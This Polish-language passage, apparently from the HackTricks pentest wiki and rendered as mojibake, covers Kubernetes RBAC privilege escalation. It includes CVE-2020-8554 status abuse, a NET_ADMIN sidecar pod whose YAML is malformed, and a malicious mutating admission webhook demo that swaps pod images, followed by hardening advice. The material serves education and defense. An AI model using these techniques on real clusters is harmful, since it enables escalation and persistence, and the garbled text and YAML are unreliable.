### Status usÅ‚ug (CVE-2020-8554)

Podmioty, ktÃ³re mogÄ… **modyfikowaÄ‡** **`services/status`**, mogÄ… ustawiÄ‡ pole `status.loadBalancer.ingress.ip` w celu wykorzystania **niezaÅ‚atanej luki CVE-2020-8554** i uruchomienia atakÃ³w **MiTM na klaster**. WiÄ™kszoÅ›Ä‡ zabezpieczeÅ„ przed CVE-2020-8554 zapobiega tylko usÅ‚ugom ExternalIP (zgodnie z [**tym**](https://github.com/PaloAltoNetworks/rbac-police/blob/main/lib/modify\_service\_status\_cve\_2020\_8554.rego)).

### Status wÄ™zÅ‚Ã³w i moduÅ‚Ã³w

Podmioty posiadajÄ…ce uprawnienia **`update`** lub **`patch`** do `nodes/status` lub `pods/status`, mogÄ… modyfikowaÄ‡ etykiety w celu wpÅ‚ywania na narzucone ograniczenia dotyczÄ…ce planowania.

## Wbudowane zapobieganie eskalacji uprawnieÅ„

Kubernetes posiada [wbudowany mechanizm](https://kubernetes.io/docs/reference/access-authn-authz/rbac/#privilege-escalation-prevention-and-bootstrapping) zapobiegajÄ…cy eskalacji uprawnieÅ„.

Ten system zapewnia, Å¼e **uÅ¼ytkownicy nie mogÄ… podnosiÄ‡ swoich uprawnieÅ„ poprzez modyfikowanie rÃ³l lub powiÄ…zaÅ„ rÃ³l**. Egzekwowanie tej zasady nastÄ™puje na poziomie interfejsu API, zapewniajÄ…c zabezpieczenie nawet wtedy, gdy autoryzator RBAC jest nieaktywny.

Zasada ta okreÅ›la, Å¼e **uÅ¼ytkownik moÅ¼e tworzyÄ‡ lub aktualizowaÄ‡ rolÄ™ tylko wtedy, gdy posiada wszystkie uprawnienia, ktÃ³re rola obejmuje**. Ponadto zakres istniejÄ…cych uprawnieÅ„ uÅ¼ytkownika musi byÄ‡ zgodny z rolÄ…, ktÃ³rÄ… prÃ³buje utworzyÄ‡ lub zmodyfikowaÄ‡: albo ogÃ³lnoklastrowy dla ClusterRoles, albo ograniczony do tej samej przestrzeni nazw (lub ogÃ³lnoklastrowy) dla Roles.

{% hint style="warning" %}
Istnieje wyjÄ…tek od poprzedniej zasady. JeÅ›li podmiot ma **czasownik `escalate`** nad **`roles`** lub **`clusterroles`**, moÅ¼e zwiÄ™kszyÄ‡ uprawnienia rÃ³l i clusterroles nawet bez posiadania odpowiednich uprawnieÅ„.
{% endhint %}

### **Pobierz i zmodyfikuj RoleBindings/ClusterRoleBindings**

{% hint style="danger" %}
**WyglÄ…da na to, Å¼e ta technika dziaÅ‚aÅ‚a wczeÅ›niej, ale wedÅ‚ug moich testÃ³w juÅ¼ nie dziaÅ‚a z tego samego powodu, co wyjaÅ›niono w poprzednim rozdziale. Nie moÅ¼esz tworzyÄ‡/modyfikowaÄ‡ rolebindingÃ³w, aby nadaÄ‡ sobie lub innemu SA pewne uprawnienia, jeÅ›li ich nie masz juÅ¼.**
{% endhint %}

Uprawnienie do tworzenia Rolebindings pozwala uÅ¼ytkownikowi **powiÄ…zaÄ‡ role z kontem usÅ‚ugi**. To uprawnienie moÅ¼e potencjalnie prowadziÄ‡ do eskalacji uprawnieÅ„, poniewaÅ¼ **pozwala uÅ¼ytkownikowi powiÄ…zaÄ‡ uprawnienia administratora z skompromitowanym kontem usÅ‚ugi.**

## Inne ataki

### Aplikacja proxy Sidecar

DomyÅ›lnie nie ma szyfrowania w komunikacji miÄ™dzy moduÅ‚ami. Wzajemna autentykacja, dwukierunkowa, moduÅ‚ do moduÅ‚u.

#### UtwÃ³rz aplikacjÄ™ proxy Sidecar <a href="#create-a-sidecar-proxy-app" id="create-a-sidecar-proxy-app"></a>

UtwÃ³rz swÃ³j plik .yaml
```bash
kubectl run app --image=bash --command -oyaml --dry-run=client > <appName.yaml> -- sh -c 'ping google.com'
```
Edytuj plik .yaml i dodaj odkomentowane linie:
```yaml
#apiVersion: v1
#kind: Pod
#metadata:
#  name: security-context-demo
#spec:
#  securityContext:
#    runAsUser: 1000
#    runAsGroup: 3000
#    fsGroup: 2000
#  volumes:
#  - name: sec-ctx-vol
#    emptyDir: {}
#  containers:
#  - name: sec-ctx-demo
#    image: busybox
command: [ "sh", "-c", "apt update && apt install iptables -y && iptables -L && sleep 1h" ]
securityContext:
capabilities:
add: ["NET_ADMIN"]
#   volumeMounts:
#   - name: sec-ctx-vol
#     mountPath: /data/demo
#   securityContext:
#     allowPrivilegeEscalation: true
```
Zobacz dzienniki proxy:
```bash
kubectl logs app -C proxy
```
WiÄ™cej informacji na: [https://kubernetes.io/docs/tasks/configure-pod-container/security-context/](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/)

### ZÅ‚oÅ›liwy kontroler przyjÄ™Ä‡

Kontroler przyjÄ™Ä‡ **przechwytuje Å¼Ä…dania do serwera API Kubernetes** przed trwaÅ‚oÅ›ciÄ… obiektu, ale **po uwierzytelnieniu** **i autoryzacji** Å¼Ä…dania.

JeÅ›li atakujÄ…cy w jakiÅ› sposÃ³b zdoÅ‚a **wstrzyknÄ…Ä‡ kontroler przyjÄ™Ä‡ mutacji**, bÄ™dzie mÃ³gÅ‚ **modyfikowaÄ‡ juÅ¼ uwierzytelnione Å¼Ä…dania**. MoÅ¼e to umoÅ¼liwiÄ‡ eskalacjÄ™ uprawnieÅ„ oraz zazwyczaj trwaÄ‡ w klastrze.

**PrzykÅ‚ad z** [**https://blog.rewanthtammana.com/creating-malicious-admission-controllers**](https://blog.rewanthtammana.com/creating-malicious-admission-controllers):
```bash
git clone https://github.com/rewanthtammana/malicious-admission-controller-webhook-demo
cd malicious-admission-controller-webhook-demo
./deploy.sh
kubectl get po -n webhook-demo -w
```
SprawdÅº status, aby zobaczyÄ‡, czy jest gotowy:
```bash
kubectl get mutatingwebhookconfigurations
kubectl get deploy,svc -n webhook-demo
```
![mutating-webhook-status-check.PNG](https://cdn.hashnode.com/res/hashnode/image/upload/v1628433436353/yHUvUWugR.png?auto=compress,format\&format=webp)

NastÄ™pnie wdroÅ¼ nowÄ… kapsuÅ‚kÄ™:
```bash
kubectl run nginx --image nginx
kubectl get po -w
```
Kiedy widzisz bÅ‚Ä…d `ErrImagePull`, sprawdÅº nazwÄ™ obrazu za pomocÄ… jednego z poniÅ¼szych zapytaÅ„:
```bash
kubectl get po nginx -o=jsonpath='{.spec.containers[].image}{"\n"}'
kubectl describe po nginx | grep "Image: "
```
![malicious-admission-controller.PNG](https://cdn.hashnode.com/res/hashnode/image/upload/v1628433512073/leFXtgSzm.png?auto=compress,format\&format=webp)

Jak widaÄ‡ na powyÅ¼szym obrazie, prÃ³bowaliÅ›my uruchomiÄ‡ obraz `nginx`, ale ostatecznie uruchomiony zostaÅ‚ obraz `rewanthtammana/malicious-image`. Co wÅ‚aÅ›nie siÄ™ staÅ‚o!!?

#### TechnicznoÅ›ci <a href="#heading-technicalities" id="heading-technicalities"></a>

Skrypt `./deploy.sh` ustanawia kontroler admijsji webhook mutujÄ…cy, ktÃ³ry modyfikuje Å¼Ä…dania do interfejsu API Kubernetes zgodnie z okreÅ›lonymi w swoich liniach konfiguracyjnych, wpÅ‚ywajÄ…c na obserwowane wyniki:
```
patches = append(patches, patchOperation{
Op:    "replace",
Path:  "/spec/containers/0/image",
Value: "rewanthtammana/malicious-image",
})
```
## Najlepsze praktyki

### **WyÅ‚Ä…czenie Automatycznego Montowania TokenÃ³w Konta UsÅ‚ugi**

* **Pody i Konta UsÅ‚ugi**: DomyÅ›lnie pody montujÄ… token konta usÅ‚ugi. Aby zwiÄ™kszyÄ‡ bezpieczeÅ„stwo, Kubernetes pozwala na wyÅ‚Ä…czenie tej funkcji automatycznego montowania.
* **Jak ZastosowaÄ‡**: Ustaw `automountServiceAccountToken: false` w konfiguracji kont usÅ‚ugi lub podÃ³w zaczynajÄ…c od wersji Kubernetes 1.6.

### **Ograniczenie Przypisywania UÅ¼ytkownikÃ³w w RoleBindings/ClusterRoleBindings**

* **WybiÃ³rcze WÅ‚Ä…czenie**: Upewnij siÄ™, Å¼e do RoleBindings lub ClusterRoleBindings sÄ… dodawani tylko niezbÄ™dni uÅ¼ytkownicy. Regularnie przeprowadzaj audyty i usuwaj nieistotnych uÅ¼ytkownikÃ³w, aby utrzymaÄ‡ wysokie bezpieczeÅ„stwo.

### **Role Specyficzne dla Przestrzeni Nazw nad Role na Poziomie Klustra**

* **Role vs. ClusterRoles**: Preferuj uÅ¼ycie Roli i RoleBindings dla uprawnieÅ„ specyficznych dla przestrzeni nazw, zamiast ClusterRoles i ClusterRoleBindings, ktÃ³re majÄ… zastosowanie na poziomie klustra. Ten podejÅ›cie oferuje bardziej precyzyjnÄ… kontrolÄ™ i ogranicza zakres uprawnieÅ„.

### **UÅ¼yj narzÄ™dzi automatyzujÄ…cych**

{% embed url="https://github.com/cyberark/KubiScan" %}

{% embed url="https://github.com/aquasecurity/kube-hunter" %}

{% embed url="https://github.com/aquasecurity/kube-bench" %}

## **Referencje**

* [**https://www.cyberark.com/resources/threat-research-blog/securing-kubernetes-clusters-by-eliminating-risky-permissions**](https://www.cyberark.com/resources/threat-research-blog/securing-kubernetes-clusters-by-eliminating-risky-permissions)
* [**https://www.cyberark.com/resources/threat-research-blog/kubernetes-pentest-methodology-part-1**](https://www.cyberark.com/resources/threat-research-blog/kubernetes-pentest-methodology-part-1)
* [**https://blog.rewanthtammana.com/creating-malicious-admission-controllers**](https://blog.rewanthtammana.com/creating-malicious-admission-controllers)

<details>

<summary><strong>Naucz siÄ™ hakowaÄ‡ AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* JeÅ›li chcesz zobaczyÄ‡ swojÄ… **firmÄ™ reklamowanÄ… w HackTricks** lub **pobraÄ‡ HackTricks w formacie PDF**, sprawdÅº [**PLANY SUBSKRYPCYJNE**](https://github.com/sponsors/carlospolop)!
* ZdobÄ…dÅº [**oficjalne gadÅ¼ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**RodzinÄ™ PEASS**](https://opensea.io/collection/the-peass-family), naszÄ… kolekcjÄ™ ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **DoÅ‚Ä…cz do** ğŸ’¬ [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **Å›ledÅº** mnie na **Twitterze** ğŸ¦ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Podziel siÄ™ swoimi sztuczkami hakowania, przesyÅ‚ajÄ…c PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
